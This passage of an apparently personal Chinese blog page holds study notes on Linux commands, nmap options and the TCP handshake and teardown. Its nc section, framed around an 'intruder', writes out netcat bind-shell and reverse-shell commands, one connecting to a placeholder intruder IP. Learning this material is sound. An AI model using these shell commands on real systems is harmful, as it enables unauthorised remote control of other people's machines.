@@ -1,0 +1,1544 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="知识和指令 基础知识 文件属性 示例：d r-x(A) r-x(B) r-x(C) 13 root(D) root(E) 0 Nov 3 11:22 1.txt\n括号部分仅作讲解用，实际上不存在\nA=所有者权限\nB=所有者所在的组的权限\nC=其他人权限\nD=文件的所有人\nE=D所在的组\n类型：\nd文件夹\n-文件\nl链接\n权限：\nr=read=4 w=write=2 x=execute=1\n权限编号的计算使用加法，例如：\n权限代码 编号 r-x 5 -rw 6 &ndash;r 4 修改文件权限：\nchmod [权限编号] [目标文件]\t修改文件权限\nchmod [权限编号] -R [文件夹]\t把文件夹和文件内所有东西都赋值为75\n示例：chmod 755 1.txt\n系统操作 防火墙 chkconfig iptables on/off\t打开/关闭防火墙\napt命令 软件安装apt-get install xxx\n基础指令： 系统指令： 系统相关 passwd\t修改当前用户密码\nifconfig\t查看ip\nwhoami\t查看自己是谁（账户）\n">
+<title></title>
+
+<link rel='canonical' href='https://www.retr0.qzz.io/p/'>
+
+<link rel="stylesheet" href="/scss/style.min.cdfea7edd08f20a450e32e39a442d404d324012e6a68d984ad7ca649217d9edf.css"><meta property='og:title' content="">
+<meta property='og:description' content="知识和指令 基础知识 文件属性 示例：d r-x(A) r-x(B) r-x(C) 13 root(D) root(E) 0 Nov 3 11:22 1.txt\n括号部分仅作讲解用，实际上不存在\nA=所有者权限\nB=所有者所在的组的权限\nC=其他人权限\nD=文件的所有人\nE=D所在的组\n类型：\nd文件夹\n-文件\nl链接\n权限：\nr=read=4 w=write=2 x=execute=1\n权限编号的计算使用加法，例如：\n权限代码 编号 r-x 5 -rw 6 &ndash;r 4 修改文件权限：\nchmod [权限编号] [目标文件]\t修改文件权限\nchmod [权限编号] -R [文件夹]\t把文件夹和文件内所有东西都赋值为75\n示例：chmod 755 1.txt\n系统操作 防火墙 chkconfig iptables on/off\t打开/关闭防火墙\napt命令 软件安装apt-get install xxx\n基础指令： 系统指令： 系统相关 passwd\t修改当前用户密码\nifconfig\t查看ip\nwhoami\t查看自己是谁（账户）\n">
+<meta property='og:url' content='https://www.retr0.qzz.io/p/'>
+<meta property='og:site_name' content='Retr0的小窝'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' />
+<meta name="twitter:title" content="">
+<meta name="twitter:description" content="知识和指令 基础知识 文件属性 示例：d r-x(A) r-x(B) r-x(C) 13 root(D) root(E) 0 Nov 3 11:22 1.txt\n括号部分仅作讲解用，实际上不存在\nA=所有者权限\nB=所有者所在的组的权限\nC=其他人权限\nD=文件的所有人\nE=D所在的组\n类型：\nd文件夹\n-文件\nl链接\n权限：\nr=read=4 w=write=2 x=execute=1\n权限编号的计算使用加法，例如：\n权限代码 编号 r-x 5 -rw 6 &ndash;r 4 修改文件权限：\nchmod [权限编号] [目标文件]\t修改文件权限\nchmod [权限编号] -R [文件夹]\t把文件夹和文件内所有东西都赋值为75\n示例：chmod 755 1.txt\n系统操作 防火墙 chkconfig iptables on/off\t打开/关闭防火墙\napt命令 软件安装apt-get install xxx\n基础指令： 系统指令： 系统相关 passwd\t修改当前用户密码\nifconfig\t查看ip\nwhoami\t查看自己是谁（账户）\n">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+        <link rel="stylesheet" href="/css/APlayer.min.css">
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css">
+        <script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"></script>
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_dda478d092d7a4a0.gif" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🥶</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Retr0的小窝</a></h1>
+            <h2 class="site-description">多冷啊，我在东北玩泥巴~</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://space.bilibili.com/349466985'
+                        target="_blank"
+                        title="Bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" /><path d="M8 3l2 3" /><path d="M16 3l-2 3" /><path d="M9 13v-2" /><path d="M15 11v2" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/makabaka11'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://t.me/ded0000'
+                        target="_blank"
+                        title="Telegram"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-telegram"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M15 10l-4 4l6 6l4 -16l-18 7l4 2l2 6l3 -4" /></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页 | Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E-about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于 | About</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档 | Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索 | Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E6%8A%80%E6%9C%AF%E9%93%BE%E6%8E%A5-links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>技术链接 | Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#基础知识">基础知识</a>
+      <ol>
+        <li><a href="#文件属性">文件属性</a></li>
+        <li><a href="#系统操作">系统操作</a>
+          <ol>
+            <li><a href="#防火墙">防火墙</a></li>
+            <li><a href="#apt命令">apt命令</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#基础指令">基础指令：</a>
+      <ol>
+        <li><a href="#系统指令">系统指令：</a>
+          <ol>
+            <li><a href="#系统相关">系统相关</a></li>
+            <li><a href="#文件相关">文件相关</a></li>
+            <li><a href="#查看进程">查看进程</a></li>
+          </ol>
+        </li>
+        <li><a href="#软件指令">软件指令：</a>
+          <ol>
+            <li><a href="#编辑器类">编辑器类：</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+
+  <ol>
+    <li><a href="#nc的使用">nc的使用</a>
+      <ol>
+        <li><a href="#基础连接">基础连接</a></li>
+        <li><a href="#远程控制">远程控制</a>
+          <ol>
+            <li><a href="#正向控制">正向控制</a></li>
+            <li><a href="#反向控制">反向控制</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#nmap的使用">nmap的使用</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#tcp的三次握手与四次挥手">TCP的三次握手与四次挥手</a>
+      <ol>
+        <li><a href="#核心前提tcp-报文关键字段">核心前提：TCP 报文关键字段</a></li>
+        <li><a href="#三次握手three-way-handshake建立可靠连接">三次握手（Three-Way Handshake）：建立可靠连接</a>
+          <ol>
+            <li><a href="#核心目的"><strong>核心目的：</strong></a></li>
+            <li><a href="#步骤拆解">步骤拆解：</a></li>
+            <li><a href="#关键设计逻辑为什么是-三次-而不是-两次"><strong>关键设计逻辑：为什么是 “三次” 而不是 “两次”？</strong></a></li>
+          </ol>
+        </li>
+        <li><a href="#四次挥手four-way-wavehand释放连接">四次挥手（Four-Way Wavehand）：释放连接</a>
+          <ol>
+            <li><a href="#核心目的-1"><strong>核心目的</strong></a></li>
+            <li><a href="#步骤拆解-1">步骤拆解：</a></li>
+            <li><a href="#关键设计逻辑为什么是-四次-而不是-三次">关键设计逻辑：为什么是 “四次” 而不是 “三次”？</a></li>
+            <li><a href="#关键细节time_wait-状态的作用">关键细节：TIME_WAIT 状态的作用</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#端口">端口</a>
+      <ol>
+        <li><a href="#核心网络服务端口知名端口0-1023">核心网络服务端口（知名端口，0-1023）</a></li>
+        <li><a href="#开发者常用端口注册端口1024-49151">开发者常用端口（注册端口，1024-49151）</a>
+          <ol>
+            <li><a href="#数据库端口">数据库端口</a></li>
+            <li><a href="#web开发服务器端口">Web开发/服务器端口</a></li>
+            <li><a href="#其他开发工具端口">其他开发工具端口</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/"></a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+     
+    
+    <footer class="article-time">
+        
+
+        
+
+        
+        <div id="viewCount">
+            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-eye"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 12a2 2 0 1 0 4 0a2 2 0 0 0 -4 0" /><path d="M21 12c-2.4 4 -5.4 6 -9 6c-3.6 0 -6.6 -2 -9 -6c2.4 -4 5.4 -6 9 -6c3.6 0 6.6 2 9 6" /></svg>
+            <time class="article-time--reading">
+                <span id="vercount_value_page_pv">loading... </span>次
+            </time>
+        </div>
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="知识和指令">知识和指令
+</h1><h2 id="基础知识">基础知识
+</h2><h3 id="文件属性">文件属性
+</h3><p>示例：<code>d r-x(A) r-x(B) r-x(C) 13 root(D) root(E) 0 Nov 3 11:22 1.txt</code></p>
+<p>括号部分仅作讲解用，实际上不存在</p>
+<p>A=所有者权限</p>
+<p>B=所有者所在的组的权限</p>
+<p>C=其他人权限</p>
+<p>D=文件的所有人</p>
+<p>E=D所在的组</p>
+<p><strong>类型：</strong></p>
+<p><code>d</code>文件夹</p>
+<p><code>-</code>文件</p>
+<p><code>l</code>链接</p>
+<p><strong>权限：</strong></p>
+<p>r=read=4  w=write=2  x=execute=1</p>
+<p><strong>权限编号的计算使用加法，例如：</strong></p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>权限代码</th>
+          <th>编号</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>r-x</td>
+          <td>5</td>
+      </tr>
+      <tr>
+          <td>-rw</td>
+          <td>6</td>
+      </tr>
+      <tr>
+          <td>&ndash;r</td>
+          <td>4</td>
+      </tr>
+  </tbody>
+</table></div>
+<p>修改文件权限：</p>
+<p><code>chmod [权限编号] [目标文件]</code>	修改文件权限</p>
+<p><code>chmod [权限编号] -R [文件夹]</code>	把文件夹和文件内所有东西都赋值为75</p>
+<p>示例：<code>chmod 755 1.txt</code></p>
+<h3 id="系统操作">系统操作
+</h3><h4 id="防火墙">防火墙
+</h4><p><code>chkconfig iptables on/off</code>	打开/关闭防火墙</p>
+<h4 id="apt命令">apt命令
+</h4><p>软件安装<code>apt-get install xxx</code></p>
+<h2 id="基础指令">基础指令：
+</h2><h3 id="系统指令">系统指令：
+</h3><h4 id="系统相关">系统相关
+</h4><p><code>passwd</code>			修改当前用户密码</p>
+<p><code>ifconfig</code>		查看ip</p>
+<p><code>whoami</code>			查看自己是谁（账户）</p>
+<p><code>clear</code>			清空当前终端</p>
+<p><code>uname</code>			查看操作系统</p>
+<p><code>uname -a</code>		查看详细版本号</p>
+<h4 id="文件相关">文件相关
+</h4><p><code>ls</code>				查看当前目录所有文件和文件夹</p>
+<p><code>ls -la</code>			查看详细信息（文件属性）</p>
+<p><code>mkdir</code>			创建目录</p>
+<p><code>cd</code>				转到指定目录</p>
+<p><code>touch</code>			创建文件</p>
+<p><code>cat</code>			查看文件</p>
+<p><code>chmod</code>			修改文件权限</p>
+<p><code>cp [被复制的文件] [复制到（包括文件名）]</code>	复制文件</p>
+<p><code>mv [被剪切的文件] [粘贴到（包括文件名）]</code>	剪切文件（也可用于修改文件名）</p>
+<p><code>rm [目标]</code>		删除</p>
+<p><code>rm -rf [目标]</code>	全部强制删除</p>
+<p><code>find [要砸那个地方查找] -name [查找的文件名]</code>	查找文件</p>
+<p><code>echo xxx</code>		回响（单独使用是复读机）</p>
+<p><code>echo xxx &gt; 1.txt</code>	创建名为1.txt的文件并写入xxx（有覆盖效果）</p>
+<p><code>echo xxx &gt;&gt; 1.txt</code>	向1.txt中追加xxx</p>
+<h4 id="查看进程">查看进程
+</h4><p><code>ps</code>					查看进程</p>
+<p><code>ps -ef</code>				查看全部进程</p>
+<p><code>ps -ef | grep xxx</code>	查看进程名字包含xxx关键词的进程</p>
+<p><code>top</code>			查看进程（打开性能监视器）</p>
+<h3 id="软件指令">软件指令：
+</h3><h4 id="编辑器类">编辑器类：
+</h4><p><code>nano</code>			用nano打开文件</p>
+<p><code>vim</code>			用vim打开文件</p>
+<hr>
+<h1 id="几个小工具">几个小工具
+</h1><h2 id="nc的使用">nc的使用
+</h2><h3 id="基础连接">基础连接
+</h3><p>服务端(被控)：</p>
+<p><code>nc -l -p [端口号]</code>			监听指定端口</p>
+<p>客户端(控制)：</p>
+<p><code>nc -nv [服务端ip] [端口号]</code>	连接服务端</p>
+<h3 id="远程控制">远程控制
+</h3><h4 id="正向控制">正向控制
+</h4><p>入侵者每次主动连接目标</p>
+<p>目标(被控)：</p>
+<p><code>nc -lp [端口号] -e cmd</code>		指客户端连接后为其打开cmd</p>
+<p>入侵：</p>
+<p><code>nc -nv [服务端ip] [端口号]</code>	连接目标</p>
+<h4 id="反向控制">反向控制
+</h4><p>目标每次自己连接入侵者</p>
+<p>目标(被控)：</p>
+<p><code>nc -nv [入侵者ip] [端口号] -e cmd</code></p>
+<p><strong>注意：如果目标系统为linux则将</strong><code>-e cmd</code><strong>改为</strong><code>-c bash</code></p>
+<h2 id="nmap的使用">nmap的使用
+</h2><p><code>nmap [可选参数] [目标ip]</code>	普通扫描</p>
+<p>参数：</p>
+<p><code>-sT</code>	tcp扫描</p>
+<p><code>-sS</code>	隐秘扫描（不形成三次握手）</p>
+<p><code>-sL</code>	[扫描一个ip段] 例如192.168.0.1/24 (指从192.168.0.1到192.168.0.255) 主要用于批量主机发现</p>
+<p><code>-sn</code>	ping扫描，只发现主机，不扫描端口，通常结合<code>-sL</code>使用</p>
+<p><code>-Pn</code>	将所有主机假定开机，跳过主机发现的过程</p>
+<p><code>-P0</code>	使用ip协议探测主机是否开启</p>
+<p><code>-sU</code>	使用UDP扫描</p>
+<p><code>-p</code>		指定扫描那些端口，例如<code>nmap -p 80,443,3380 192.168.1.0/24</code></p>
+<p><code>-O</code>		识别操作系统</p>
+<h1 id="追加网络相关">追加：网络相关
+</h1><h2 id="tcp的三次握手与四次挥手">TCP的三次握手与四次挥手
+</h2><p>TCP（Transmission Control Protocol，传输控制协议）是 <strong>面向连接、可靠的字节流协议</strong>，其核心机制 “三次握手”（建立连接）和 “四次挥手”（释放连接）是保障数据可靠传输的基础。</p>
+<h3 id="核心前提tcp-报文关键字段">核心前提：TCP 报文关键字段
+</h3><p>在理解握手 / 挥手前，需先掌握 TCP 报文中的 3 个核心标志位和 2 个序列号字段，这是通信的 “信号标识”：</p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th style="text-align: left"><strong>字段</strong></th>
+          <th style="text-align: left"><strong>作用</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><strong>SYN</strong></td>
+          <td style="text-align: left">同步标志（Synchronize）：用于发起连接，请求同步对方的序列号（<code>seq</code>）</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>ACK</strong></td>
+          <td style="text-align: left">确认标志（Acknowledgment）：用于确认收到数据，携带确认号（<code>ack</code>）</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>FIN</strong></td>
+          <td style="text-align: left">终止标志（Finish）：用于发起连接释放，告知对方 “我已无数据要发送”</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>seq（序列号）</strong></td>
+          <td style="text-align: left">标记当前发送数据的字节位置（随机初始化，后续按字节递增）</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>ack（确认号）</strong></td>
+          <td style="text-align: left">标记 “期望下次收到的对方序列号”（= 已收到的对方 seq + 1）</td>
+      </tr>
+  </tbody>
+</table></div>
+<p>注：TCP 是<strong>全双工通信</strong>（双方可同时发送数据），因此每个方向都需要独立的序列号和确认机制。</p>
+<h3 id="三次握手three-way-handshake建立可靠连接">三次握手（Three-Way Handshake）：建立可靠连接
+</h3><h4 id="核心目的"><strong>核心目的：</strong>
+</h4><ol>
+<li>双方确认彼此的 “发送能力” 和 “接收能力” 均正常；</li>
+<li>协商初始序列号（<code>seq</code>），为后续数据传输的 “有序性” 和 “去重” 打下基础；</li>
+<li>避免 “失效的连接请求报文段” 导致错误连接。</li>
+</ol>
+<h4 id="步骤拆解">步骤拆解：
+</h4><ol>
+<li><strong>第一次握手（客户端→服务器）</strong>：
+<ul>
+<li>客户端发送报文：<code>SYN=1</code>（发起连接），<code>seq=x</code>（x 是客户端随机生成的初始序列号，如 1000）；</li>
+<li>客户端状态变为 <code>SYN_SENT</code>（等待服务器确认）；</li>
+<li>作用：告诉服务器 “我想和你建立连接，请你同步我的序列号”。</li>
+</ul>
+</li>
+<li><strong>第二次握手（服务器→客户端）</strong>：
+<ul>
+<li>服务器收到 SYN 后，回复报文：<code>SYN=1</code>（同意建立连接，同步自己的序列号）+ <code>ACK=1</code>（确认收到客户端的 SYN）；</li>
+<li>服务器序列号：<code>seq=y</code>（y 是服务器随机生成的初始序列号，如 2000）；</li>
+<li>服务器确认号：<code>ack=x+1</code>（表示 “我已收到你到 x 的所有数据，下次请从 x+1 开始发”）；</li>
+<li>服务器状态变为 <code>SYN_RCVD</code>（等待客户端最终确认）；</li>
+<li>作用：服务器同时完成 “确认客户端接收 / 发送能力” 和 “发起自己的连接同步”。</li>
+</ul>
+</li>
+<li><strong>第三次握手（客户端→服务器）</strong>：
+<ul>
+<li>客户端收到服务器的 SYN+ACK 后，回复报文：<code>ACK=1</code>（确认收到服务器的 SYN）；</li>
+<li>客户端序列号：<code>seq=x+1</code>（按字节递增，因第一次仅发送了 SYN 标志位，无数据字节，故 + 1）；</li>
+<li>客户端确认号：<code>ack=y+1</code>（表示 “我已收到你到 y 的所有数据，下次请从 y+1 开始发”）；</li>
+<li>客户端状态变为 <code>ESTABLISHED</code>（连接建立），服务器收到后也变为 <code>ESTABLISHED</code>；</li>
+<li>作用：客户端最终确认服务器的连接请求，双方完成 “双向能力验证” 和 “序列号协商”。</li>
+</ul>
+</li>
+</ol>
+<h4 id="关键设计逻辑为什么是-三次-而不是-两次"><strong>关键设计逻辑：为什么是 “三次” 而不是 “两次”？</strong>
+</h4><ul>
+<li><strong>两次握手的风险</strong>：若客户端发送的 “连接请求报文段” 因网络延迟未及时到达服务器，客户端会超时重发。若延迟的报文段后续到达服务器，服务器会误以为是新的连接请求，直接回复 SYN+ACK 并建立连接，但客户端此时已不需要该连接，会忽略服务器的回复，导致服务器资源被浪费（半连接状态）。</li>
+<li><strong>三次握手的必要性</strong>：第三次握手是客户端对服务器 SYN 的确认，确保 “服务器知道客户端已收到自己的连接响应”，从而避免上述资源浪费。只有三次握手，才能实现双方 “双向可靠确认”。</li>
+</ul>
+<h3 id="四次挥手four-way-wavehand释放连接">四次挥手（Four-Way Wavehand）：释放连接
+</h3><h4 id="核心目的-1"><strong>核心目的</strong>
+</h4><p>TCP 是全双工通信，双方可同时发送数据。释放连接时，需确保：</p>
+<ol>
+<li>双方都已完成数据传输（无未发送 / 未接收的数据）；</li>
+<li>双方都明确 “对方已停止发送数据”，避免提前关闭连接导致数据丢失。</li>
+</ol>
+<h4 id="步骤拆解-1">步骤拆解：
+</h4><ol>
+<li><strong>第一次挥手（客户端→服务器）</strong>：
+<ul>
+<li>客户端完成数据发送后，发送报文：<code>FIN=1</code>（告知服务器 “我已无数据要发，请求关闭我的发送通道”）；</li>
+<li>客户端序列号：<code>seq=x+1</code>（基于之前的数据传输进度，假设之前已发送到 x）；</li>
+<li>客户端确认号：<code>ack=y+1</code>（确认之前收到的服务器数据）；</li>
+<li>客户端状态变为 <code>FIN_WAIT_1</code>（等待服务器确认关闭）；</li>
+<li>注意：客户端关闭的是 “发送通道”，仍可接收服务器的数据（全双工特性）。</li>
+</ul>
+</li>
+<li><strong>第二次挥手（服务器→客户端）</strong>：
+<ul>
+<li>服务器收到 FIN 后，回复报文：<code>ACK=1</code>（确认收到客户端的关闭请求）；</li>
+<li>服务器序列号：<code>seq=y+1</code>（基于之前的传输进度）；</li>
+<li>服务器确认号：<code>ack=x+2</code>（因客户端发送了 FIN 标志位，相当于 1 个字节的 “关闭请求数据”，故 x+1+1=x+2）；</li>
+<li>服务器状态变为 <code>CLOSE_WAIT</code>（等待自己的数据发送完成后，再关闭自己的发送通道）；</li>
+<li>客户端收到后，状态变为 <code>FIN_WAIT_2</code>（等待服务器的 FIN 报文）；</li>
+<li>作用：服务器确认 “客户端不再发送数据”，但自己可能仍有数据要发给客户端（如剩余的响应数据）。</li>
+</ul>
+</li>
+<li><strong>第三次挥手（服务器→客户端）</strong>：
+<ul>
+<li>服务器完成所有数据发送后，发送报文：<code>FIN=1</code>（告知客户端 “我也无数据要发，请求关闭我的发送通道”）；</li>
+<li>服务器序列号：<code>seq=y+1</code>（无新数据发送，序列号不变）；</li>
+<li>服务器确认号：<code>ack=x+2</code>（与第二次挥手一致）；</li>
+<li>服务器状态变为 <code>LAST_ACK</code>（等待客户端最终确认）；</li>
+<li>作用：服务器关闭自己的发送通道，告知客户端 “可以彻底关闭连接了”。</li>
+</ul>
+</li>
+<li><strong>第四次挥手（客户端→服务器）</strong>：
+<ul>
+<li>客户端收到服务器的 FIN 后，回复报文：<code>ACK=1</code>（确认收到服务器的关闭请求）；</li>
+<li>客户端序列号：<code>seq=x+2</code>（基于之前的确认号）；</li>
+<li>客户端确认号：<code>ack=y+2</code>（服务器的 FIN 相当于 1 个字节，故 y+1+1=y+2）；</li>
+<li>客户端状态变为 <code>TIME_WAIT</code>（等待 2MSL 后关闭），服务器收到后状态变为 <code>CLOSED</code>；</li>
+<li>客户端等待 2MSL（Maximum Segment Lifetime，报文最大生存时间，默认 2 分钟）后，状态变为 <code>CLOSED</code>；</li>
+<li>作用：确保服务器能收到客户端的最终确认（避免服务器因报文丢失而重发 FIN）。</li>
+</ul>
+</li>
+</ol>
